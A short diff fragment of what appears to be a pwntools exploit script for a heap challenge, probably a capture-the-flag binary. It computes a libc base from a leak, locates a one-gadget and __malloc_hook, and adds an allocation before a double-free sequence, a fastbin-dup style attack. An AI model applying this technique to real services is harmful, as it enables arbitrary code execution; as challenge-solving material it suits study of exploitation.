@@ -31,6 +31,7 @@ libcbase = u64(p.recv(6).ljust(8,'\x00'))-0x3C4B20-88
 log.success('LibcBase:\t'+hex(libcbase))
 onegadget = libcbase + 0xf1147
 malloc_hook=libcbase+0x3C4B20-0x10
+add('136','U'*0x10)
 dele('1')
 dele('2')
 dele('1')
